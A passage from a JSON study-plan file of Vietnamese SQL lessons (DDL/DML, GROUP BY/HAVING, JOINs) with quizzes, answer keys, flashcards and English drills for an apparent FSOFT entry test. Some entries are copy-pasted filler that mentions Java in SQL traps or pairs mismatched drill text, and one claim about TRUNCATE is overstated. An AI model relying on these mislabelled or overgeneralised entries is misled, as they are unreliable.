          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Phân loại ngôn ngữ SQL",
          "questions": [
            {
              "q": "Phân biệt các nhóm lệnh SQL: DDL, DML, DCL, TCL.",
              "ans": "DDL (Data Definition): `CREATE`, `ALTER`, `DROP`, `TRUNCATE`. DML (Data Manipulation): `SELECT`, `INSERT`, `UPDATE`, `DELETE`. DCL (Control): `GRANT`, `REVOKE`. TCL (Transaction): `COMMIT`, `ROLLBACK`."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "DELETE vs TRUNCATE vs DROP",
          "questions": [
            {
              "q": "So sánh `DELETE` và `TRUNCATE` về tốc độ và khả năng rollback.",
              "ans": "`DELETE` là lệnh DML, xóa từng dòng có ghi transaction log chi tiết, hỗ trợ mệnh đề `WHERE` và có thể `ROLLBACK`. `TRUNCATE` là lệnh DDL, giải phóng toàn bộ trang dữ liệu (deallocate data pages), tốc độ cực nhanh, reset identity counter, không có `WHERE` và trong nhiều hệ thống không thể rollback độc lập."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace câu lệnh UPDATE có điều kiện",
          "questions": [
            {
              "q": "Cho bảng `Employees` có cột `salary`: 100, 200, 300. Chạy câu lệnh:\n```sql\nUPDATE Employees SET salary = salary * 2 WHERE salary < 250;\n```\nCác giá trị trong bảng sau khi update là gì?",
              "ans": "Các giá trị là: `200, 400, 300`. Hai dòng có lương 100 và 200 thỏa điều kiện < 250 nên được nhân 2 (thành 200 và 400). Dòng lương 300 giữ nguyên."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy so sánh với giá trị NULL trong SQL",
          "questions": [
            {
              "q": "Câu truy vấn `SELECT * FROM Users WHERE age = NULL;` có trả về các bản ghi có `age` là NULL không?",
              "ans": "Không bao giờ! Trong chuẩn SQL, so sánh với `NULL` qua dấu bằng `=` luôn trả về `UNKNOWN` (coi như false). Cú pháp đúng bắt buộc phải dùng toán tử `IS NULL`."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Ràng buộc toàn vẹn ON DELETE CASCADE",
          "questions": [
            {
              "q": "Ràng buộc khóa ngoại `ON DELETE CASCADE` có tác động gì khi một bản ghi ở bảng cha bị xóa?",
              "ans": "Hệ quản trị CSDL sẽ tự động xóa toàn bộ các bản ghi con ở bảng con có liên kết tham chiếu tới bản ghi cha đó, tránh lỗi Orphan records (dữ liệu mồ côi)."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_22_1",
          "q": "Lệnh SQL nào sau đây thuộc nhóm DDL (Data Definition Language)?",
          "options": [
            "ALTER TABLE",
            "UPDATE",
            "INSERT",
            "DELETE"
          ],
          "correct": 0,
          "exp": "ALTER TABLE, CREATE TABLE, DROP, TRUNCATE thuộc nhóm DDL (định nghĩa cấu trúc). UPDATE, INSERT, DELETE thuộc nhóm DML (thao tác dữ liệu)."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Sự khác biệt giữa lệnh DELETE và TRUNCATE trong SQL?",
          "a": "DELETE là lệnh DML, xóa từng dòng có thể dùng WHERE, có thể ROLLBACK được và không reset IDENTITY. TRUNCATE là lệnh DDL, xóa toàn bộ dữ liệu cực nhanh, không có WHERE, tự động COMMIT (không thể rollback) và reset lại cột IDENTITY về 1.",
          "trap": "TRUNCATE không kích hoạt trigger DELETE."
        }
      ],
      "dailyEnglish": [
        {
          "id": 64,
          "vi": "Lấy danh sách từ DB và đẩy vào danh sách",
          "en": "Get data from database and show on list"
        },
        {
          "id": 65,
          "vi": "Kiểm tra dữ liệu đã tồn tại hay chưa ? Nếu có cho ra thông báo lỗi.",
          "en": "Check if [var] exists or not? If existed, show error notice"
        },
        {
          "id": 66,
          "vi": "Tạo biến A lấy dữ liệu từ B",
          "en": "Create variable with data from B"
        },
        {
          "id": 67,
          "vi": "Xử lý điều hướng cho action A",
          "en": "Process navigation for action A"
        },
        {
          "id": 68,
          "vi": "Kiểm tra kết nối dữ liệu",
          "en": "Function of checking data connection"
        }
      ],
      "chapter": "SQL: DDL, DML & Basic Queries"
    },
    "23": {
      "day": 23,
      "week": 4,
      "title": "SQL: Aggregation & GROUP BY / HAVING",
      "topics": [
        "Aggregate functions: COUNT(*), COUNT(col), SUM, AVG, MIN, MAX",
        "GROUP BY clause",
        "WHERE vs HAVING (WHERE lọc trước khi gom nhóm, HAVING lọc sau khi gom nhóm)"
      ],
      "tasks": [
        "Luyện viết 10 câu query GROUP BY kèm HAVING",
        "Tập trả lời phỏng vấn: WHERE khác HAVING điểm nào?"
      ],
      "englishDrill": [
        {
          "id": 67,
          "vi": "Xử lý điều hướng cho action A",
          "en": "Process navigation for action A"
        },
        {
          "id": 68,
          "vi": "Kiểm tra kết nối dữ liệu",
          "en": "Function of checking data connection"
        },
        {
          "id": 69,
          "vi": "Hiển thị lớp theo mã trường",
          "en": "Function of showing classes by school code"
        },
        {
          "id": 70,
          "vi": "Hàm kiểm tra tồn tại của trường bắt buộc nhập",
          "en": "Function of checking existion of required inputting field"
        },
        {
          "id": 71,
          "vi": "Hàm kiểm tra tồn tại của trường bắt buộc nhập",
          "en": "Check data by row on form"
        }
      ],
      "summary": "SQL Nâng Cao: Hàm Tổng Hợp (COUNT, SUM, AVG) & GROUP BY / HAVING.",
      "coreTheory": "\n### 1. Hàm tổng hợp (Aggregate Functions) & NULL\n- `COUNT(*)`: Đếm tất cả các dòng, bất kể cột nào mang giá trị `NULL`.\n- `COUNT(column)`: Chỉ đếm các dòng mà cột đó có giá trị khác `NULL`.\n- `SUM`, `AVG`, `MIN`, `MAX`: Bỏ qua các giá trị `NULL`.\n\n### 2. WHERE vs HAVING (Khác biệt cốt lõi)\n- `WHERE`: Lọc dữ liệu từng dòng đơn lẻ **TRƯỚC KHI** gom nhóm. Không thể dùng hàm tổng hợp trong WHERE!\n- `HAVING`: Lọc các nhóm dữ liệu **SAU KHI** đã gom nhóm bởi `GROUP BY`. Chuyên dùng với hàm tổng hợp.\n- **Thứ tự thực thi câu lệnh SQL:**\n  `FROM -> WHERE -> GROUP BY -> HAVING -> SELECT -> ORDER BY`\n",
      "codeSnippet": "SELECT department_id, COUNT(*), AVG(salary)\nFROM Employees\nWHERE status = 'ACTIVE'      -- Lọc trước khi gom nhóm\nGROUP BY department_id\nHAVING COUNT(*) >= 5         -- Lọc nhóm sau khi gom nhóm\nORDER BY AVG(salary) DESC;",
      "traps": [
        "Viết hàm tổng hợp trong WHERE (ví dụ WHERE COUNT(*) > 5) là lỗi cú pháp SQL kinh điển.",
        "Các cột trong SELECT không phải hàm tổng hợp thì bắt buộc phải có mặt trong GROUP BY."
      ],
      "quickQuiz": [
        {
          "q": "Mệnh đề nào lọc trước khi gom nhóm?",
          "a": "WHERE"
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟠 HIGH (SQL & Web & TestKing)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Aggregate functions: COUNT(*), COUNT(col), SUM, AVG, MIN, MAX, GROUP BY clause, WHERE vs HAVING (WHERE lọc trước khi gom nhóm, HAVING lọc sau khi gom nhóm).",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. Hàm tổng hợp (Aggregate Functions) & NULL\n- `COUNT(*)`: Đếm tất cả các dòng, bất kể cột nào mang giá trị `NULL`.\n- `COUNT(column)`: Chỉ đếm các dòng mà cột đó có giá trị khác `NULL`.\n- `SUM`, `AVG`, `MIN`, `MAX`: Bỏ qua các giá trị `NULL`.\n\n### 2. WHERE vs HAVING (Khác biệt cốt lõi)\n- `WHERE`: Lọc dữ liệu từng dòng đơn lẻ **TRƯỚC KHI** gom nhóm. Không thể dùng hàm tổng hợp trong WHERE!\n- `HAVING`: Lọc các nhóm dữ liệu **SAU KHI** đã gom nhóm bởi `GROUP BY`. Chuyên dùng với hàm tổng hợp.\n- **Thứ tự thực thi câu lệnh SQL:**\n  `FROM -> WHERE -> GROUP BY -> HAVING -> SELECT -> ORDER BY`\n",
          "code": "SELECT department_id, COUNT(*), AVG(salary)\nFROM Employees\nWHERE status = 'ACTIVE'      -- Lọc trước khi gom nhóm\nGROUP BY department_id\nHAVING COUNT(*) >= 5         -- Lọc nhóm sau khi gom nhóm\nORDER BY AVG(salary) DESC;"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d23_1",
          "level": "Medium",
          "question": "Câu truy vấn SQL tính lương trung bình sau có lỗi gì không?",
          "code": "-- Bảng Employees(DeptID int, Salary decimal)\nSELECT DeptID, AVG(Salary)\nFROM Employees\nWHERE AVG(Salary) > 1000\nGROUP BY DeptID;",
          "options": [
            "Lỗi cú pháp vì dùng hàm tổng hợp AVG trong mệnh đề WHERE",
            "Chạy bình thường và trả về các phòng ban có lương > 1000",
            "Lỗi cú pháp do thiếu ORDER BY",
            "Lỗi do GROUP BY phải đứng trước WHERE"
          ],
          "correctIndex": 0,
          "explanation": "Trong SQL, hàm tổng hợp (Aggregate functions như COUNT, SUM, AVG, MIN, MAX) KHÔNG ĐƯỢC PHÉP xuất hiện trong mệnh đề `WHERE` vì WHERE lọc dữ liệu trước khi nhóm. Muốn lọc theo hàm tổng hợp, bắt buộc phải dùng mệnh đề `HAVING AVG(Salary) > 1000` đặt sau `GROUP BY`."
        }
      ],
      "examTraps": [
        {
          "trap": "SELECT các cột không nằm trong GROUP BY mà không có hàm tổng hợp",
          "whyPeopleWrong": "Viết SELECT emp_name, dept_id, COUNT(*) GROUP BY dept_id.",
          "wrongThinking": "Tưởng rằng DB sẽ tự đoán emp_name của dòng nào.",
          "correctRule": "Trong chuẩn SQL ANSI, mọi cột xuất hiện ở mệnh đề SELECT mà không nằm trong hàm tổng hợp (SUM, COUNT...) thì BẮT BUỘC PHẢI XUẤT HIỆN TRONG MỆNH ĐỀ GROUP BY!",
          "code": "-- LỖI: SELECT dept_id, emp_name, COUNT(*) FROM emp GROUP BY dept_id;\n-- ĐÚNG: SELECT dept_id, COUNT(*) FROM emp GROUP BY dept_id;",
          "miniCheck": "Kiểm tra xem các cột không có hàm tổng hợp ở SELECT đã có mặt trong GROUP BY hay chưa."
        },
        {
          "trap": "Cạm bẫy 1: Viết hàm tổng hợp trong WHERE (ví dụ WHERE COUNT(*) > 5) là lỗi cú pháp SQL kinh điển.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "SELECT department_id, COUNT(*), AVG(salary)\nFROM Employees\nWHERE status = 'ACTIVE'      -- Lọc trước khi gom nhóm\nGROUP BY department_id\nHAVING COUNT(*) >= 5         -- Lọc nhóm sau khi gom nhóm\nORDER BY AVG(salary) DESC;",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: Các cột trong SELECT không phải hàm tổng hợp thì bắt buộc phải có mặt trong GROUP BY.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "SELECT department_id, COUNT(*), AVG(salary)\nFROM Employees\nWHERE status = 'ACTIVE'      -- Lọc trước khi gom nhóm\nGROUP BY department_id\nHAVING COUNT(*) >= 5         -- Lọc nhóm sau khi gom nhóm\nORDER BY AVG(salary) DESC;",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Thứ tự thực thi mệnh đề trong SQL",
          "questions": [
            {
              "q": "Nêu thứ tự thực thi logic của một câu lệnh SQL từ đầu đến cuối.",
              "ans": "1) `FROM` -> 2) `ON` -> 3) `JOIN` -> 4) `WHERE` -> 5) `GROUP BY` -> 6) `WITH CUBE/ROLLUP` -> 7) `HAVING` -> 8) `SELECT` -> 9) `DISTINCT` -> 10) `ORDER BY` -> 11) `TOP / LIMIT / OFFSET`."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "WHERE vs HAVING",
          "questions": [
            {
              "q": "Tại sao không thể viết `WHERE COUNT(*) > 5`?",
              "ans": "Vì mệnh đề `WHERE` được thực thi TRƯỚC khi phép gom nhóm `GROUP BY` diễn ra, tại thời điểm đó dữ liệu chưa được tổng hợp nên không thể áp dụng các hàm aggregate. Muốn lọc theo hàm tổng hợp bắt buộc phải đặt trong mệnh đề `HAVING`."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace câu lệnh GROUP BY và HAVING",
          "questions": [
            {
              "q": "Cho bảng `Sales(dept, amount)` chứa:\n('IT', 100), ('IT', 200), ('HR', 150), ('HR', 50)\nChạy câu lệnh:\n```sql\nSELECT dept, SUM(amount) FROM Sales GROUP BY dept HAVING SUM(amount) > 250;\n```\nKết quả trả về dòng nào?",
              "ans": "Trả về duy nhất 1 dòng: `IT | 300`. Nhóm 'IT' có tổng 100+200=300 (> 250 nên thỏa điều kiện HAVING). Nhóm 'HR' có tổng 150+50=200 (không thỏa > 250 nên bị loại)."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy COUNT(*) vs COUNT(column_name)",
          "questions": [
            {
              "q": "Một cột `bonus` có 3 dòng: 100, NULL, 200. Kết quả của `COUNT(*)` và `COUNT(bonus)` là bao nhiêu?",
              "ans": "`COUNT(*)` = 3 (đếm toàn bộ số dòng dữ liệu). `COUNT(bonus)` = 2 (hàm COUNT đếm theo tên cột sẽ tự động bỏ qua các giá trị `NULL`)."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Tối ưu câu truy vấn subquery với EXISTS vs IN",
          "questions": [
            {
              "q": "Tại sao `WHERE EXISTS` thường tối ưu hơn `WHERE IN` khi danh sách con chứa nhiều dữ liệu hoặc có chứa giá trị `NULL`?",
              "ans": "`EXISTS` hoạt động theo cơ chế boolean short-circuit: Dừng quét ngay khi tìm thấy bản ghi đầu tiên khớp điều kiện, và không bị lỗi trả về rỗng khi tập kết quả chứa `NULL` như toán tử `NOT IN`."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_23_1",
          "q": "Câu lệnh SQL sau có hợp lệ không?\n`SELECT dept_id, AVG(salary) FROM Employee WHERE AVG(salary) > 1000 GROUP BY dept_id;`",
          "options": [
            "Không hợp lệ vì hàm tổng hợp AVG() không được phép dùng trong mệnh đề WHERE",
            "Hợp lệ hoàn toàn",
            "Không hợp lệ vì thiếu ORDER BY",
            "Không hợp lệ vì không thể GROUP BY cột dept_id"
          ],
          "correct": 0,
          "exp": "Hàm tổng hợp (AVG, SUM, COUNT) không thể đứng trong WHERE vì WHERE lọc từng dòng trước khi gom nhóm. Điều kiện lọc nhóm phải nằm trong HAVING: 'HAVING AVG(salary) > 1000'."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Phân biệt mệnh đề WHERE và HAVING trong câu lệnh SQL có GROUP BY?",
          "a": "WHERE lọc các bản ghi đơn lẻ TRƯỚC KHI gom nhóm (không dùng được hàm tổng hợp như COUNT, SUM). HAVING lọc các nhóm kết quả SAU KHI gom nhóm dựa trên kết quả của hàm tổng hợp (vd: HAVING COUNT(*) > 5).",
          "trap": "Dùng hàm SUM, AVG trong WHERE sẽ bị lỗi cú pháp ngay lập tức!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 67,
          "vi": "Xử lý điều hướng cho action A",
          "en": "Process navigation for action A"
        },
        {
          "id": 68,
          "vi": "Kiểm tra kết nối dữ liệu",
          "en": "Function of checking data connection"
        },
        {
          "id": 69,
          "vi": "Hiển thị lớp theo mã trường",
          "en": "Function of showing classes by school code"
        },
        {
          "id": 70,
          "vi": "Hàm kiểm tra tồn tại của trường bắt buộc nhập",
          "en": "Function of checking existion of required inputting field"
        },
        {
          "id": 71,
          "vi": "Hàm kiểm tra tồn tại của trường bắt buộc nhập",
          "en": "Check data by row on form"
        }
      ],
      "chapter": "SQL: Aggregation & GROUP BY / HAVING"
    },
    "24": {
      "day": 24,
      "week": 4,
      "title": "SQL: JOINs & Subqueries + Interview Prep",
      "topics": [
        "INNER JOIN vs LEFT JOIN vs RIGHT JOIN vs FULL OUTER JOIN",
        "Subquery (Single row, Multi row with IN/EXISTS/ANY/ALL)",
        "UNION vs UNION ALL"
      ],
      "tasks": [
        "Luyện 10 câu query JOIN phức tạp",
        "Luyện 7 câu SQL phỏng vấn trong roadmap (INNER vs LEFT, DELETE vs TRUNCATE...)"
      ],
      "englishDrill": [
        {
          "id": 70,
          "vi": "Hàm kiểm tra tồn tại của trường bắt buộc nhập",
          "en": "Function of checking existion of required inputting field"
        },
        {
          "id": 71,
          "vi": "Hàm kiểm tra tồn tại của trường bắt buộc nhập",
          "en": "Check data by row on form"
        },
        {
          "id": 72,
          "vi": "Hiển thị lỗi nếu ngày bắt đầu lớn hơn ngày kết thúc",
          "en": "Show error message if Start date is greater than End date"
        },
        {
          "id": 73,
          "vi": "Lấy dữ liệu trường id từ form",
          "en": "Get data of ID field from form"
        },
        {
          "id": 74,
          "vi": "Lấy tất cả danh sách dữ liệu có trong cơ sở dữ liệu",
          "en": "Get all data list from database"
        }
      ],
      "summary": "SQL JOINs: INNER JOIN, LEFT JOIN, RIGHT JOIN, Subqueries & Phỏng vấn Audit.",
      "coreTheory": "\n### 1. Phân biệt các loại JOIN\n- **INNER JOIN:** Chỉ trả về các bản ghi khớp điều kiện ở cả hai bảng.\n- **LEFT JOIN (LEFT OUTER JOIN):** Trả về toàn bộ bảng bên trái. Bảng bên phải không khớp sẽ mang giá trị `NULL`.\n- **RIGHT JOIN:** Trả về toàn bộ bảng bên phải.\n- **FULL OUTER JOIN:** Kết hợp cả LEFT và RIGHT.\n\n### 2. Subquery (Truy vấn con)\n- Single-row subquery: Dùng toán tử so sánh thông thường (`=, >, <`).\n- Multi-row subquery: Dùng toán tử `IN, ANY, ALL, EXISTS`.\n",
      "codeSnippet": "-- Tìm khách hàng CHƯA TỪNG mua hàng:\nSELECT c.id, c.name\nFROM Customers c\nLEFT JOIN Orders o ON c.id = o.customer_id\nWHERE o.id IS NULL;",
      "traps": [
        "Tìm bản ghi chưa liên kết bắt buộc dùng LEFT JOIN kèm điều kiện WHERE right_table.id IS NULL.",
        "UNION loại bỏ trùng lặp, UNION ALL giữ nguyên bản ghi trùng (nhanh hơn)."
      ],
      "quickQuiz": [
        {
          "q": "Khi bảng bên phải không có dữ liệu khớp trong LEFT JOIN, cột của nó nhận giá trị gì?",
          "a": "NULL"
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟠 HIGH (SQL & Web & TestKing)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: INNER JOIN vs LEFT JOIN vs RIGHT JOIN vs FULL OUTER JOIN, Subquery (Single row, Multi row with IN/EXISTS/ANY/ALL), UNION vs UNION ALL.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. Phân biệt các loại JOIN\n- **INNER JOIN:** Chỉ trả về các bản ghi khớp điều kiện ở cả hai bảng.\n- **LEFT JOIN (LEFT OUTER JOIN):** Trả về toàn bộ bảng bên trái. Bảng bên phải không khớp sẽ mang giá trị `NULL`.\n- **RIGHT JOIN:** Trả về toàn bộ bảng bên phải.\n- **FULL OUTER JOIN:** Kết hợp cả LEFT và RIGHT.\n\n### 2. Subquery (Truy vấn con)\n- Single-row subquery: Dùng toán tử so sánh thông thường (`=, >, <`).\n- Multi-row subquery: Dùng toán tử `IN, ANY, ALL, EXISTS`.\n",
          "code": "-- Tìm khách hàng CHƯA TỪNG mua hàng:\nSELECT c.id, c.name\nFROM Customers c\nLEFT JOIN Orders o ON c.id = o.customer_id\nWHERE o.id IS NULL;"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d24_1",
          "level": "Hard",
          "question": "Cho 2 bảng Customers(ID, Name) và Orders(ID, CustID). Câu truy vấn sau trả về gì?",
          "code": "SELECT C.Name, O.ID AS OrderID\nFROM Customers C\nLEFT JOIN Orders O ON C.ID = O.CustID\nWHERE O.ID IS NULL;",
          "options": [
            "Danh sách tất cả khách hàng CHƯA TỪNG đặt đơn hàng nào",
            "Danh sách tất cả khách hàng đã có ít nhất 1 đơn hàng",
            "Bị lỗi cú pháp tại dòng WHERE O.ID IS NULL",
            "Trả về bảng rỗng vì LEFT JOIN không bao giờ có NULL"
          ],
          "correctIndex": 0,
          "explanation": "Đây là kỹ thuật kinh điển trong SQL: `LEFT JOIN ... WHERE right_table.key IS NULL` dùng để tìm các phần tử thuộc bảng A mà hoàn toàn không có liên kết tương ứng trong bảng B (khách hàng chưa từng phát sinh đơn hàng)."
        }
      ],
      "examTraps": [
        {
          "trap": "Sử dụng NOT IN với Subquery có chứa giá trị NULL",
          "whyPeopleWrong": "Viết WHERE id NOT IN (SELECT parent_id FROM Table).",
          "wrongThinking": "Nghĩ rằng NOT IN sẽ loại trừ các id khớp.",
          "correctRule": "Nếu tập kết quả của Subquery bên trong NOT IN có chứa DÙ CHỈ 1 GIÁ TRỊ NULL, toàn bộ biểu thức NOT IN sẽ trả về UNKNOWN/rỗng, câu query không trả về bất kỳ dòng nào! Khắc phục bằng cách thêm WHERE parent_id IS NOT NULL hoặc dùng NOT EXISTS!",
          "code": "SELECT * FROM emp WHERE id NOT IN (SELECT manager_id FROM emp WHERE manager_id IS NOT NULL);",
          "miniCheck": "Dùng NOT IN với Subquery hãy cẩn trọng tối đa với giá trị NULL, ưu tiên dùng NOT EXISTS."
        },
        {
          "trap": "Cạm bẫy 1: Tìm bản ghi chưa liên kết bắt buộc dùng LEFT JOIN kèm điều kiện WHERE right_table.id IS NULL.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "-- Tìm khách hàng CHƯA TỪNG mua hàng:\nSELECT c.id, c.name\nFROM Customers c\nLEFT JOIN Orders o ON c.id = o.customer_id\nWHERE o.id IS NULL;",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: UNION loại bỏ trùng lặp, UNION ALL giữ nguyên bản ghi trùng (nhanh hơn).",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "-- Tìm khách hàng CHƯA TỪNG mua hàng:\nSELECT c.id, c.name\nFROM Customers c\nLEFT JOIN Orders o ON c.id = o.customer_id\nWHERE o.id IS NULL;",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Các loại SQL JOIN",
          "questions": [
            {
              "q": "Phân biệt kết quả giữa `INNER JOIN` và `LEFT JOIN`.",
              "ans": "`INNER JOIN` chỉ trả về những bản ghi có giá trị khớp ở cả 2 bảng. `LEFT JOIN` trả về TẤT CẢ các bản ghi của bảng bên trái; các cột của bảng bên phải nếu không khớp sẽ nhận giá trị `NULL`."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "CROSS JOIN và Tích Descartes",
          "questions": [
            {
              "q": "Nếu bảng A có 5 dòng và bảng B có 10 dòng, câu lệnh `SELECT * FROM A CROSS JOIN B;` trả về bao nhiêu dòng?",
              "ans": "Trả về 50 dòng (5 * 10 = 50, tích Descartes giữa 2 tập hợp)."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace câu lệnh LEFT JOIN với WHERE điều kiện lọc NULL",
          "questions": [
            {
              "q": "Cho 2 bảng:\n`Customers(id, name)`: (1, 'A'), (2, 'B')\n`Orders(id, cust_id)`: (101, 1)\nChạy câu lệnh:\n```sql\nSELECT c.name FROM Customers c LEFT JOIN Orders o ON c.id = o.cust_id WHERE o.id IS NULL;\n```\nKết quả trả về là gì?",
              "ans": "Trả về: `'B'`. Khách hàng 1 có đơn hàng (o.id = 101). Khách hàng 2 không có đơn hàng nên cột `o.id` là `NULL`, thỏa điều kiện `WHERE o.id IS NULL`. Đây là kỹ thuật chuẩn để tìm các bản ghi không có quan hệ con."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy đặt điều kiện ở ON vs WHERE trong LEFT JOIN",
          "questions": [
            {
              "q": "Trong `LEFT JOIN`, điều kiện lọc `o.status = 'ACTIVE'` đặt ở mệnh đề `ON` khác gì đặt ở mệnh đề `WHERE`?",
              "ans": "Đặt ở `ON`: Vẫn giữ lại toàn bộ các dòng của bảng bên trái (chỉ bảng bên phải không thỏa sẽ thành NULL). Đặt ở `WHERE`: Sẽ lọc bỏ hoàn toàn các dòng có `NULL` của bảng bên phải, vô tình biến câu lệnh thành `INNER JOIN`!"
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Self Join để truy vấn cấu trúc phân cấp",
          "questions": [
            {
              "q": "Viết cú pháp truy vấn Self Join để lấy tên nhân viên cùng tên người quản lý của họ từ bảng `Employee(id, name, manager_id)`.",
              "ans": "`SELECT e.name AS Employee, m.name AS Manager FROM Employee e LEFT JOIN Employee m ON e.manager_id = m.id;`"
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_24_1",
          "q": "Để tìm tất cả khách hàng chưa từng phát sinh bất kỳ đơn hàng nào, câu truy vấn nào tối ưu và chính xác nhất?",
          "options": [
            "SELECT c.* FROM Customers c LEFT JOIN Orders o ON c.id = o.customer_id WHERE o.id IS NULL",
            "SELECT c.* FROM Customers c INNER JOIN Orders o ON c.id = o.customer_id WHERE o.id IS NULL",
            "SELECT c.* FROM Customers c RIGHT JOIN Orders o ON c.id = o.customer_id",
            "SELECT * FROM Customers WHERE id = (SELECT customer_id FROM Orders)"
          ],
          "correct": 0,
          "exp": "LEFT JOIN giữ lại toàn bộ khách hàng. Với khách chưa mua hàng, các cột của Orders sẽ mang giá trị NULL. Mệnh đề WHERE o.id IS NULL sẽ lọc ra chính xác những khách hàng này."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Khi dùng LEFT JOIN, các cột của bảng bên phải không có dữ liệu khớp sẽ nhận giá trị gì?",
          "a": "Nhận giá trị NULL. Để lọc ra những bản ghi chỉ có ở bảng bên trái mà không có ở bảng bên phải, ta dùng điều kiện `WHERE right_table.id IS NULL`.",
          "trap": "So sánh với NULL trong SQL phải dùng `IS NULL`, dùng `= NULL` luôn trả về False/Unknown!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 70,
          "vi": "Hàm kiểm tra tồn tại của trường bắt buộc nhập",
          "en": "Function of checking existion of required inputting field"
        },
        {
          "id": 71,
          "vi": "Hàm kiểm tra tồn tại của trường bắt buộc nhập",
          "en": "Check data by row on form"
        },
        {
          "id": 72,
          "vi": "Hiển thị lỗi nếu ngày bắt đầu lớn hơn ngày kết thúc",
          "en": "Show error message if Start date is greater than End date"
        },
        {
          "id": 73,
          "vi": "Lấy dữ liệu trường id từ form",
          "en": "Get data of ID field from form"
        },
        {
          "id": 74,
          "vi": "Lấy tất cả danh sách dữ liệu có trong cơ sở dữ liệu",
          "en": "Get all data list from database"
        }
      ],
      "chapter": "SQL: JOINs & Subqueries"
    },
    "25": {
      "day": 25,
      "week": 4,
      "title": "JavaWeb: Servlet Architecture & Lifecycle",
      "topics": [
        "Servlet Lifecycle: init(), service() -> doGet()/doPost(), destroy()",
        "HttpServletRequest & HttpServletResponse",
        "Web container / Tomcat role",
        "web.xml configuration vs @WebServlet annotation"
      ],
      "tasks": [
